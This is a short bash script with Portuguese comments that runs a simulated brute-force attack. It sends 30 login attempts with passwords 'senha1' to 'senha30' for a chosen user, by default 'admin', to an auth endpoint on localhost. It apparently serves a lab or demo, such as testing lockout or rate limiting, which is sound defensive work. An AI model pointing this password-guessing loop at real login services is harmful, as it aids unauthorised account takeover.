#!/usr/bin/env bash
# Uso: ./forca_bruta.sh http://localhost:8081/api/auth/login usuario
URL="${1:-http://localhost:8081/api/auth/login}"
USER="${2:-admin}"
for i in $(seq 1 30); do
  curl -s -X POST "$URL" -H 'Content-Type: application/x-www-form-urlencoded' --data "username=$USER&password=senha$i" | jq . 2>/dev/null || true
done
echo "Ataque simulado concluído."
